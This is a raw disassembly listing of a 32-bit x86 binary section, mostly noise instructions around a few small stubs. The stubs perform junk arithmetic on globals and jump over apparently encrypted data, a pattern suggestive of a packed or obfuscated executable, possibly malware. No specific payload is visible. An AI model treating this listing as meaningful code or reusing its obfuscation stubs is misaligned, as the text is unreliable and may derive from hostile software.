  40620f:	adc    dh,al
  406211:	cdq    
  406212:	sbb    eax,0x515021bf
  406217:	mov    DWORD PTR [ecx-0x2ecf6eb6],edi
  40621d:	shl    DWORD PTR [edx-0x44],0xe0
  406221:	mov    edi,0xe1ab183a
  406226:	(bad)  
  406227:	sbb    esp,ebp
  406229:	xchg   edx,edx
  40622b:	inc    esi
  40622c:	les    esi,FWORD PTR [edx-0x3628eb62]
  406232:	sbb    al,0x2e
  406234:	mov    BYTE PTR [edx-0x86b8330],al
  40623a:	and    eax,0x5c568c71
  40623f:	ficomp DWORD PTR [eax+0x78]
  406242:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406243:	mov    al,ds:0xb7d9d64d
  406248:	scas   eax,DWORD PTR es:[edi]
  406249:	mov    ch,0xdc
  40624b:	fldenv [edx+0x1a]
  40624e:	test   DWORD PTR [edx+eiz*1],edi
  406251:	inc    esi
  406252:	retf   
  406253:	push   ax
  406255:	cmp    al,0x24
  406257:	mov    ah,0xd1
  406259:	jp     0x40628d
  40625b:	or     ecx,DWORD PTR [eax]
  40625d:	push   0xffffff9f
  40625f:	sahf   
  406260:	push   ss
  406261:	test   al,0xe1
  406263:	loopne 0x406200
  406265:	xchg   ebx,eax
  406266:	ss jle 0x4062e7
  406269:	shl    DWORD PTR [eax+0x1a63992c],cl
  40626f:	sub    eax,0x8e94352b
  406274:	jbe    0x406223
  406276:	das    
  406277:	imul   edi,DWORD PTR [eax+0x7a],0x5a
  40627b:	inc    edx
  40627c:	and    eax,0x2cc4f857
  406281:	pop    ebp
  406282:	cmp    eax,0xcf546f38
  406287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406288:	fs (bad) 
  40628a:	lds    edi,FWORD PTR [esi-0x22]
  40628d:	push   ebp
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd89,0x42fe06
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e773,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fdf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fdf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fdf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e5bb
  4062e2:	cmp    DWORD PTR ds:0x42fdf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fdf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fdf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fdf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fdf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	test   BYTE PTR [ebp+0x3c8cebd1],0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406339
  40633b:	push   ebp
  40633c:	lea    ebx,cs:[edi+0x54]
  406340:	cdq    
  406341:	cmp    al,0x7e
  406343:	mov    dl,0xb0
  406345:	popa   
  406346:	push   edx
  406347:	cs test esp,eax
  40634a:	mov    eax,0x45a75a28
  40634f:	ret    
  406350:	call   0xee6780db
  406355:	jnp    0x406367
  406357:	pop    edi
  406358:	pop    ecx
  406359:	jle    0x406397
  40635b:	dec    ecx
  40635c:	popa   
  40635d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40635e:	jle    0x40637e
  406360:	add    dh,BYTE PTR [ebp-0x3759af2]
  406366:	jecxz  0x4063ba
  406368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406369:	jnp    0x406361
  40636b:	clc    
  40636c:	test   BYTE PTR [edi+0x641d49b4],ah
  406372:	mov    dl,dh
  406374:	adc    al,BYTE PTR [edx]
  406376:	(bad)  
  406377:	call   0x1e1e:0xf89d4e2c
  40637e:	cmp    BYTE PTR [ebp+0x27],al
  406381:	ja     0x406346
  406383:	lea    ebx,[ebx-0x73]
  406386:	pop    eax
  406387:	push   edi
  406388:	xchg   BYTE PTR ds:0x2e2a8f71,cl
  40638e:	jp     0x406399
  406390:	shr    BYTE PTR [edi+0x333c993f],1
  406396:	arpl   dx,dx
  406398:	jg     0x40639a
  40639a:	loop   0x4063ca
  40639c:	(bad)  
  40639d:	adc    ch,BYTE PTR [esi+0x6e]
  4063a0:	stos   BYTE PTR es:[edi],al
  4063a1:	iret   
  4063a2:	pusha  
  4063a3:	push   edx
  4063a4:	xor    cl,BYTE PTR [ebx-0x779098e1]
  4063aa:	rcl    cl,1
  4063ac:	jl     0x406421
  4063ae:	call   0x8f18847a
  4063b3:	lock push ebp
  4063b5:	das    
  4063b6:	(bad)  
  4063b7:	aad    0x43
  4063b9:	mov    ch,0xf1
  4063bb:	lods   al,BYTE PTR ds:[esi]
  4063bc:	mov    esp,0x3bc99b19
  4063c1:	jg     0x406418
  4063c3:	push   ebp
  4063c4:	jl     0x40643f
  4063c6:	or     cl,dh
  4063c8:	inc    eax
  4063c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063ca:	push   ss
  4063cb:	inc    esp
  4063cc:	aam    0x7
  4063ce:	sub    BYTE PTR [ecx+0x51],0x61
  4063d2:	pushf  
  4063d3:	loopne 0x4063a3
  4063d5:	sbb    eax,0x2bc01efa
  4063da:	fwait
  4063db:	pop    edi
  4063dc:	das    
  4063dd:	sub    BYTE PTR [edi-0x532aa6ae],ch
  4063e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063e4:	mov    ds:0xb8338700,al
  4063e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063ea:	jmp    0x40638b
  4063ec:	xchg   ebx,eax
  4063ed:	in     al,0x61
  4063ef:	ja     0x4063fa
  4063f1:	lods   al,BYTE PTR ds:[esi]
  4063f2:	sbb    eax,DWORD PTR [edi+0x29]
  4063f5:	push   ebx
  4063f6:	xchg   edi,eax
  4063f7:	adc    eax,0x2f9507e2
  4063fc:	ret    0xd195
  4063ff:	rcr    DWORD PTR ds:0x2d1007c9,cl
  406405:	cmp    eax,0x177b450e
  40640a:	or     DWORD PTR [ebp+0x63d59413],esp
  406410:	mov    al,0xe
  406412:	sti    
  406413:	adc    DWORD PTR [edi-0x43],0xe7b1cda3
  40641a:	loope  0x4063a1
  40641c:	push   ebp
  40641d:	jl     0x406425
  40641f:	fild   DWORD PTR [eax+ecx*8]
  406422:	mov    edx,0xece50b1f
  406427:	call   0x9c73:0xa57556df
  40642e:	mov    dh,BYTE PTR [ebx+edx*4+0x2acc1ca0]
  406435:	add    ah,BYTE PTR [ebx+0x792f5117]
  40643b:	xchg   edx,eax
  40643c:	call   0x5c1072df
  406441:	sub    edx,esi
  406443:	lods   al,BYTE PTR ds:[esi]
  406444:	jecxz  0x406442
  406446:	stc    
  406447:	fimul  WORD PTR [ebx]
  406449:	push   0xffffffa6
  40644b:	inc    ebx
  40644c:	xchg   ecx,eax
  40644d:	retf   0x5fbc
  406450:	jns    0x406458
  406452:	jecxz  0x406450
  406454:	test   BYTE PTR [ebx-0x205fc191],ah
  40645a:	mov    ecx,0xe4c73c63
  40645f:	pop    esp
  406460:	inc    edx
  406461:	jae    0x40644a
  406463:	push   ebx
  406464:	inc    edi
  406465:	(bad)  
  406466:	xor    al,0x11
  406468:	test   al,0x23
  40646a:	jne    0x40649d
  40646c:	pusha  
  40646d:	fcmovne st,st(1)
  40646f:	add    eax,0x6713b6cc
  406474:	jns    0x40642e
  406476:	mov    ebp,0x39633e7b
  40647b:	mov    esp,0xafa88b4e
  406480:	(bad)  
  406481:	or     eax,0x74da141
  406486:	arpl   WORD PTR fs:[ebp+ebx*4+0xc215fda],di
  40648e:	push   ds
  40648f:	dec    ebp
  406490:	cmc    
  406491:	gs retf 0xdc93
  406495:	leave  
  406496:	jnp    0x40647c
  406498:	loope  0x406500
  40649a:	(bad)  
  40649b:	push   ebx
  40649c:	dec    esp
  40649d:	daa    
  40649e:	jmp    0x4064a1
  4064a0:	cmp    eax,0x75c1fa94
  4064a5:	push   0xffffff8b
  4064a7:	out    0xb7,eax
  4064a9:	in     al,dx
  4064aa:	cmovns edx,ebx
  4064ad:	fcom   DWORD PTR [edx-0x7e]
  4064b0:	lds    edx,FWORD PTR [ecx+ebp*1+0x17]
  4064b4:	add    BYTE PTR [ebp+0x6c],ah
  4064b7:	sbb    BYTE PTR [esi+0x14],bl
  4064ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064bb:	add    BYTE PTR [ecx+0x407dab34],cl
  4064c1:	cmp    eax,0x46884f0a
  4064c6:	add    edi,DWORD PTR [esi-0x6139453d]
  4064cc:	sti    
  4064cd:	(bad)  
  4064ce:	daa    
  4064cf:	adc    BYTE PTR [eax+0x440a986c],ah
  4064d5:	inc    eax
  4064d6:	push   edi
  4064d7:	xor    al,0xe7
  4064d9:	gs retf 0x18f8
  4064dd:	push   edx
  4064de:	sbb    al,BYTE PTR ds:0x5e4ced60
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fdf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fd79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fdf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fdf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fd59,0x42e77b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	arpl   WORD PTR [ebx+0x36],cx
  406569:	pop    edx
  40656a:	xor    edi,DWORD PTR [edx]
  40656c:	jo     0x4065de
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	cmp    BYTE PTR [edi],cl
  406574:	inc    ebx
  406575:	data16 jb 0x4065b4
  406578:	(bad)  
  406579:	and    DWORD PTR [esi-0x6d],edx
  40657c:	fst    QWORD PTR [ecx+eiz*2-0x15e01afe]
  406583:	dec    ecx
  406584:	dec    edi
  406585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406586:	das    
  406587:	or     eax,0x55012d10
  40658c:	fnstenv [ecx-0x1647f228]
  406592:	and    ah,BYTE PTR [ebx+0x415987cf]
  406598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406599:	stos   DWORD PTR es:[edi],eax
  40659a:	cmp    cl,BYTE PTR [ebp-0x4ac63d33]
  4065a0:	mov    ch,0xca
  4065a2:	sbb    BYTE PTR [ebx-0x3f497850],dl
  4065a8:	mov    al,BYTE PTR [ebx]
  4065aa:	rcl    DWORD PTR [ecx+0x29],0x44
  4065ae:	dec    eax
  4065af:	pop    esi
  4065b0:	mov    al,0x5e
  4065b2:	push   ss
  4065b3:	adc    eax,0x1f569c94
  4065b8:	fist   WORD PTR [eax]
  4065ba:	xchg   esp,eax
  4065bb:	adc    esi,ebp
  4065bd:	pop    ebp
  4065be:	and    edx,DWORD PTR [ecx-0x63]
  4065c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065c2:	mov    edx,0xb45893dd
  4065c7:	mov    DWORD PTR [ebp-0x5a],ecx
  4065ca:	pop    ds
  4065cb:	lds    ebp,FWORD PTR [eax]
  4065cd:	and    al,0x3d
  4065cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065d0:	push   esp
  4065d1:	xor    BYTE PTR [edi+ebx*2+0x1797963b],al
  4065d8:	sahf   
  4065d9:	sub    BYTE PTR [eax+0x1323e925],ah
  4065df:	js     0x406621
  4065e1:	jno    0x4065b2
  4065e3:	ss pushf 
  4065e5:	mov    ecx,0xf0549e75
  4065ea:	das    
  4065eb:	push   ebp
  4065ec:	fdivr  st,st(2)
  4065ee:	mov    ah,0x71
  4065f0:	call   0xc30e121
  4065f5:	test   BYTE PTR [edi+0x7f1d0492],al
  4065fb:	push   esp
  4065fc:	sub    DWORD PTR [ebp+0x6b3989d5],ebx
  406602:	sub    esi,DWORD PTR [edi]
  406604:	mov    ch,0x8
  406606:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406607:	sbb    edi,DWORD PTR [eax-0x45]
  40660a:	popa   
  40660b:	mov    ch,0x43
  40660d:	adc    esi,DWORD PTR [edi+0x27a85223]
  406613:	icebp  
  406614:	fstp   DWORD PTR [edx]
  406616:	xor    esp,edx
  406618:	jbe    0x40665a
  40661a:	ds or  ch,dh
  40661d:	gs jae 0x406694
  406620:	add    DWORD PTR [ebx-0x69],ebp
  406623:	fstp   TBYTE PTR ds:0xad853f07
  406629:	stos   DWORD PTR es:[edi],eax
  40662a:	rcr    DWORD PTR [eax+0x5d8e104],1
  406630:	add    ebp,0xfffffff4
  406633:	je     0x4065e1
  406635:	pop    esp
  406636:	lods   al,BYTE PTR ds:[esi]
  406637:	xor    DWORD PTR [ecx],esp
  406639:	mov    eax,0x5218b69f
  40663e:	sar    DWORD PTR ds:0x98cee29d,cl
  406644:	das    
  406645:	iret   
  406646:	outs   dx,DWORD PTR ds:[esi]
  406647:	pop    ds
  406648:	xor    ecx,ecx
  40664a:	xor    al,0x40
  40664c:	mov    al,0x5c
  40664e:	push   cs
  40664f:	shl    BYTE PTR [esi+0xb1f6811],0x1e
  406656:	lds    eax,FWORD PTR [edi+0x4f]
  406659:	cwde   
  40665a:	or     ebp,edx
  40665c:	adc    al,0xb0
  40665e:	dec    esp
  40665f:	lea    edx,[ebx+0x41]
  406662:	iret   
  406663:	xchg   ecx,eax
  406664:	mov    BYTE PTR [ecx+0x5d],ch
  406667:	pop    ebx
  406668:	loop   0x406612
  40666a:	shr    BYTE PTR [ecx+0x4776a0d],1
  406670:	scas   eax,DWORD PTR es:[edi]
  406671:	dec    eax
  406672:	nop
  406673:	(bad)  
  406674:	nop
  406675:	cmp    BYTE PTR [edx+0xbca9604],al
  40667b:	xlat   BYTE PTR ds:[ebx]
  40667c:	lods   eax,DWORD PTR ds:[esi]
  40667d:	sub    BYTE PTR [edi+0x24],bh
  406680:	or     al,0x6e
  406682:	mov    esi,0x68bc77b
  406687:	mov    cl,0xd9
  406689:	dec    ebx
  40668a:	shl    DWORD PTR [edi-0x70],0xc0
  40668e:	lods   eax,DWORD PTR ds:[esi]
  40668f:	pop    ss
  406690:	jbe    0x406641
  406692:	dec    ecx
  406693:	leave  
  406694:	shl    DWORD PTR [ecx+0x3ede4433],1
  40669a:	jne    0x40661d
  40669c:	and    al,0x63
  40669e:	mov    ebp,0xb7e20d6a
  4066a3:	or     ebx,edx
  4066a5:	loopne 0x4066f9
  4066a7:	mov    dh,0x6a
  4066a9:	mov    ds:0x5bc9f827,eax
  4066ae:	mov    dl,0x1b
  4066b0:	mov    esi,0xb7c15722
  4066b5:	ficomp DWORD PTR [eax]
  4066b7:	jg     0x4066bf
  4066b9:	pop    ebx
  4066ba:	mov    ebp,0xd71513a9
  4066bf:	cdq    
  4066c0:	gs mov ah,0x75
  4066c3:	sar    edx,cl
  4066c5:	in     eax,0x3
  4066c7:	add    esp,edi
  4066c9:	jae    0x4066c2
  4066cb:	js     0x40671d
  4066cd:	aad    0xc0
  4066cf:	adc    DWORD PTR [esi],ecx
  4066d1:	outs   dx,DWORD PTR ds:[esi]
  4066d2:	nop
  4066d3:	pop    ebp
  4066d4:	mov    eax,ds:0x5fb3264
  4066d9:	lds    esi,FWORD PTR [edx]
  4066db:	dec    ebx
  4066dc:	pop    ds
  4066dd:	xchg   DWORD PTR [ebx],esi
  4066df:	cmp    edx,DWORD PTR [edi+0x2df17196]
  4066e5:	dec    edx
  4066e6:	cld    
  4066e7:	rep ins BYTE PTR es:[edi],dx
  4066e9:	aad    0x7b
  4066eb:	repnz and BYTE PTR [eax],ah
  4066ee:	inc    eax
  4066ef:	es xor ecx,esi
  4066f2:	mov    al,ds:0x3920a087
  4066f7:	pushf  
  4066f8:	ds mov dl,0x21
  4066fb:	in     al,dx
  4066fc:	cmp    BYTE PTR [ecx+ebx*8-0x67],cl
  406700:	mov    ch,0xb9
  406702:	adc    eax,0x98470a42
  406707:	push   eax
  406708:	fld    QWORD PTR [ebx*2+0x6ac86ff3]
  40670f:	cmc    
  406710:	inc    eax
  406711:	cdq    
  406712:	jnp    0x4066a7
  406714:	out    0x45,al
  406716:	adc    esi,DWORD PTR [ebx+0x572b73a5]
  40671c:	push   ebx
  40671d:	stos   DWORD PTR es:[edi],eax
  40671e:	gs out 0xf4,eax
  406721:	jmp    0x57b9f8b5
  406726:	adc    edx,esp
  406728:	sbb    eax,0xb888d234
  40672d:	int    0x0
  40672f:	jmp    0x406783
  406731:	je     0x40671b
  406733:	data16 sbb BYTE PTR ds:0x28b4d8b,0x2e
  40673b:	sub    eax,DWORD PTR [ebx+0x481a732]
  406741:	stos   BYTE PTR es:[edi],al
  406742:	(bad)  
  406744:	fild   WORD PTR [bx+si+0x69]
  406748:	push   ebp
  406749:	xor    al,0x54
  40674b:	jns    0x406793
  40674d:	add    cl,BYTE PTR [ebp-0x9]
  406750:	cmp    BYTE PTR [eax+0x65],0xbe
  406754:	inc    eax
  406755:	lods   al,BYTE PTR ds:[esi]
  406756:	push   edi
  406757:	jp     0x406754
  406759:	aaa    
  40675a:	sbb    eax,0xfb3e803c
  40675f:	retf   0xc23f
  406762:	xor    DWORD PTR [ecx-0x60],eax
  406765:	repz fidiv DWORD PTR [edx]
  406768:	add    bh,BYTE PTR [edi+0x2dac8461]
  40676e:	pop    ss
  40676f:	mov    ah,al
  406771:	or     al,0x9c
  406773:	sar    BYTE PTR [ecx-0x6a7d9fb2],cl
  406779:	fadd   st,st(0)
  40677b:	add    ebx,esi
  40677d:	scas   al,BYTE PTR es:[edi]
  40677e:	sub    BYTE PTR [edx],0x7e
  406781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406782:	inc    esi
  406783:	gs je  0x406739
  406786:	cmc    
  406787:	scas   eax,DWORD PTR es:[edi]
  406788:	push   esi
  406789:	inc    edx
  40678a:	and    eax,esi
  40678c:	cmc    
  40678d:	mov    ds:0xcf4d5e25,eax
  406792:	sbb    DWORD PTR [ecx-0x11],ebp
  406795:	icebp  
  406796:	cld    
  406797:	clc    
  406798:	sub    esp,DWORD PTR [ebx+0x2b]
  40679b:	std    
  40679c:	(bad)  
  40679d:	rcl    BYTE PTR [esi+ecx*1],1
  4067a0:	into   
  4067a1:	es pop esp
  4067a3:	cli    
  4067a4:	loopne 0x406796
  4067a6:	cmp    BYTE PTR [eax],bl
  4067a8:	ds dec edx
  4067aa:	sbb    bl,ch
  4067ac:	sub    al,0xb1
  4067ae:	jl     0x40682d
  4067b0:	push   0xff2bc18c
  4067b5:	pop    ebx
  4067b6:	bnd jo 0x406768
  4067b9:	xlat   BYTE PTR ds:[ebx]
  4067ba:	imul   ecx,DWORD PTR [esi+ebx*8+0x60],0xffffffa4
  4067bf:	pop    esi
  4067c0:	lea    esp,ds:0x3c8b4c00
  4067c6:	ja     0x4067ab
  4067c8:	fs pop edi
  4067ca:	mov    ecx,0xbabdb81a
  4067cf:	nop
  4067d0:	sar    al,1
  4067d2:	pop    ebx
  4067d3:	inc    edx
  4067d4:	fdiv   QWORD PTR [eax-0x53]
  4067d7:	js     0x406775
  4067d9:	gs out 0x66,eax
  4067dc:	imul   ebp,DWORD PTR [ecx+0x4b],0xffffffc7
  4067e0:	mov    edx,DWORD PTR [ebp+0x10]
  4067e3:	mov    DWORD PTR [edx+0x8],eax
  4067e6:	xor    eax,edx
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fd55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e1a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e77b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fd65,0x42e793
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	loopne 0x406808
  406848:	repnz adc BYTE PTR [ebp-0x1d8f8fc8],ah
  40684f:	jle    0x4068c1
  406851:	jo     0x406859
  406853:	hlt    
  406854:	adc    al,0xcc
  406856:	sti    
  406857:	sti    
  406858:	(bad)  
  406859:	stos   DWORD PTR es:[edi],eax
  40685a:	rcr    ch,0xf7
  40685d:	in     eax,0x48
  40685f:	push   0xcae45b42
  406864:	int3   
  406865:	jp     0x4068cb
  406867:	jg     0x40689e
  406869:	and    eax,0xed7f306f
  40686e:	cwde   
  40686f:	lods   eax,DWORD PTR ds:[esi]
  406870:	xchg   esp,eax
  406871:	mov    ebx,0x2f01b41e
  406876:	fbld   TBYTE PTR [esi-0x79]
  406879:	or     eax,DWORD PTR [ebx+0x79afef99]
  40687f:	xchg   BYTE PTR [ecx+0x1a],bl
  406882:	mov    esi,0x63a09cee
  406887:	or     eax,0xf40aede4
  40688c:	sti    
  40688d:	pop    edi
  40688e:	jnp    0x406880
  406890:	inc    ecx
  406891:	mov    eax,ds:0x47ba6bc7
  406896:	adc    BYTE PTR [esi],ch
  406898:	inc    edi
  406899:	retf   
  40689a:	inc    edx
  40689b:	aad    0x11
  40689d:	outs   dx,DWORD PTR ds:[esi]
  40689e:	es push edx
  4068a0:	sub    al,0xcf
  4068a2:	jb     0x406898
  4068a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068a5:	jae    0x40684a
  4068a7:	cmp    DWORD PTR [edx-0x285dd4ef],0xd1b8c874
  4068b1:	ret    0x8013
  4068b4:	mov    edx,0xf49ae44f
  4068b9:	arpl   dx,ax
  4068bb:	scas   eax,DWORD PTR es:[edi]
  4068bc:	xchg   edx,eax
  4068bd:	(bad)  
  4068be:	aas    
  4068bf:	test   BYTE PTR [esp+eax*8+0x5cc2590],dl
  4068c6:	imul   eax,DWORD PTR [ecx],0x92b9dfd6
  4068cc:	rol    ah,1
  4068ce:	pop    edx
  4068cf:	fdiv   QWORD PTR [ebx]
  4068d1:	mov    WORD PTR [edx+ebp*2],cs
  4068d4:	inc    esp
  4068d5:	or     cl,BYTE PTR [ebx-0x8]
  4068d8:	icebp  
  4068d9:	sbb    esp,DWORD PTR [ecx]
  4068db:	lock es es xchg edi,eax
  4068df:	out    dx,al
  4068e0:	stos   BYTE PTR es:[edi],al
  4068e1:	fiadd  DWORD PTR [eax-0x45674d93]
  4068e7:	jns    0x4068f2
  4068e9:	enter  0x7c97,0x26
  4068ed:	fdivr  DWORD PTR [eax+0xe9e946]
  4068f3:	xchg   edi,eax
  4068f4:	lods   al,BYTE PTR ds:[esi]
  4068f5:	add    BYTE PTR [esp+esi*2-0x58d1b9d2],dh
  4068fc:	aam    0xe6
  4068fe:	pop    ebx
  4068ff:	pop    esp
  406900:	dec    eax
  406901:	repz add BYTE PTR [esi-0x78dca653],dl
  406908:	dec    ecx
  406909:	mov    ds:0x460a6838,al
  40690e:	sub    ah,BYTE PTR [edi+0x5f1d2f97]
  406914:	push   edx
  406915:	iret   
  406916:	jecxz  0x4068e8
  406918:	imul   BYTE PTR [esi]
  40691a:	lahf   
  40691b:	mov    al,ds:0xa833e759
  406920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406921:	dec    ebp
  406922:	xor    ecx,edx
  406924:	jo     0x4068dc
  406926:	int    0x31
  406928:	imul   ebx,DWORD PTR [edx],0xd5ed347
  40692e:	inc    esp
  40692f:	inc    eax
  406930:	fwait
  406931:	outs   dx,DWORD PTR ds:[esi]
  406932:	sub    BYTE PTR [edx+ebx*4-0x3],0x8
  406937:	xchg   ebp,eax
  406938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406939:	inc    eax
  40693a:	fiadd  DWORD PTR [esi]
  40693c:	and    ebp,DWORD PTR [eax+eax*1-0x5209eff2]
  406943:	sbb    bh,BYTE PTR [esi+0x5befbda9]
  406949:	rcl    DWORD PTR [ebp+0x17c429cb],1
  40694f:	popf   
  406950:	aas    
  406951:	js     0x4069ac
  406953:	repnz ss aad 0xf0
  406957:	adc    ebx,DWORD PTR [ecx+0x4f]
  40695a:	sar    BYTE PTR ds:0x9ca6e5cd,1
  406960:	call   0x5aecc894
  406965:	push   es
  406966:	push   es
  406967:	popf   
  406968:	mov    esp,0xf709c73
  40696d:	scas   al,BYTE PTR es:[edi]
  40696e:	cwde   
  40696f:	scas   eax,DWORD PTR es:[edi]
  406970:	mov    al,0xf3
  406972:	adc    ch,bh
  406974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406975:	inc    esi
  406976:	adc    eax,0xf0fac931
  40697b:	pop    edi
  40697c:	jecxz  0x406902
  40697e:	es es out dx,al
  406981:	pop    ss
  406982:	xor    DWORD PTR [ecx+0x3b],ebp
  406985:	sbb    bl,al
  406987:	in     eax,dx
  406988:	xor    ch,BYTE PTR [esi]
  40698a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40698b:	cmp    al,0x9b
  40698d:	dec    edx
  40698e:	xor    dh,BYTE PTR [ebx-0x5c9a3e52]
  406994:	unpckhps xmm7,XMMWORD PTR [eax-0x6deef3d2]
  40699b:	cmp    DWORD PTR ds:0x9c100b88,ecx
  4069a1:	jmp    0x79ef1eeb
  4069a6:	xor    BYTE PTR [eax-0x6e],bl
  4069a9:	mov    ebp,0x1599160d
  4069ae:	rcl    BYTE PTR [edi],1
  4069b0:	pusha  
  4069b1:	jecxz  0x40693f
  4069b3:	xor    BYTE PTR [eax+esi*1+0x6d9aa65f],dh
  4069ba:	ret    
  4069bb:	test   DWORD PTR [ebp-0x77ddd393],0x6846e9ba
  4069c5:	inc    edx
  4069c6:	mov    bh,0x58
  4069c8:	lods   al,BYTE PTR ds:[esi]
  4069c9:	iret   
  4069ca:	xlat   BYTE PTR ds:[ebx]
  4069cb:	push   edi
  4069cc:	mov    cs,edi
  4069ce:	lods   al,BYTE PTR ds:[esi]
  4069cf:	scas   al,BYTE PTR es:[edi]
  4069d0:	or     bl,BYTE PTR [ebx-0x7b9fa2ad]
  4069d6:	jns    0x406a55
  4069d8:	lock (bad) 
  4069da:	xlat   BYTE PTR ds:[ebx]
  4069db:	mov    dl,0xe8
  4069dd:	cmp    edi,ebx
  4069df:	mov    bh,0xf2
  4069e1:	mov    edi,0x5b8005d3
  4069e6:	and    DWORD PTR [ecx+0x6db71502],0x47497ad9
  4069f0:	jb     0x4069e0
  4069f2:	sbb    al,0xad
  4069f4:	shl    edx,0xcf
  4069f7:	cmp    ebx,DWORD PTR [esi-0x6a]
  4069fa:	pop    esp
  4069fb:	jb     0x406a68
  4069fd:	pop    ebp
  4069fe:	push   esi
  4069ff:	push   ebx
  406a00:	mov    edx,0x9043e2
  406a05:	outs   dx,BYTE PTR ds:[esi]
  406a06:	sub    BYTE PTR [ecx+ebx*2-0xa],ch
  406a0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a0b:	rcr    BYTE PTR [edi],0xea
  406a0e:	mov    ds:0x9df515b,eax
  406a13:	test   eax,0xd5bad7f6
  406a18:	xchg   edi,eax
  406a19:	(bad)  
  406a1a:	cmp    BYTE PTR [eax+eax*8+0x634cf770],bl
  406a21:	imul   ebx,DWORD PTR [edi+0x2cadfb0b],0xffffffcc
  406a28:	sub    esi,DWORD PTR [ebx-0x799f186]
